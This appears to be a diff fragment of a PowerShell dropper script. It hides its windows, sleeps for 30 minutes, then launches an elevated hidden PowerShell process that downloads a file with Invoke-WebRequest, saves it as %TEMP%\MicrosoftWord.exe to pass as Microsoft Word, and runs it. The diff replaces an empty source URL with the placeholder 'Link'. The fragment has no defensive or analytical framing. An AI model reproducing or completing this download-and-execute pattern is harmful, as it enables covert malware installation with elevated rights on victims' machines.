@@ -44,5 +44,5 @@ cls
 exit" -WindowStyle hidden
 Start-Sleep -s 1800
 Start-Process -FilePath "powershell" -Verb
-RunAs -WindowStyle hidden -ArgumentList "$source = ""; $destination = "%TEMP%\MicrosoftWord.exe"; Invoke-WebRequest $source -OutFile $destination;
+RunAs -WindowStyle hidden -ArgumentList "$source = "Link"; $destination = "%TEMP%\MicrosoftWord.exe"; Invoke-WebRequest $source -OutFile $destination;
 Start-Process -FilePath %TEMP%\MicrosoftWord.exe"
